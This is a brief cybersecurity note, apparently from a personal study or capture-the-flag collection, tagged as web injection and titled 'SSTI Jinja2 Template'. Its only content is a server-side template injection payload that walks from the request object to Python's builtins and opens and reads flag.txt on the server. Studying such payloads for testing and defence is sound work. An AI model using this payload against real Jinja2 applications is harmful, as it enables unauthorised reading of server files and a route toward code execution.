---
tags:
  - "#cybersecurity/web-sec/injection"
---

## SSTI Jinja2 Template
```
{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}
```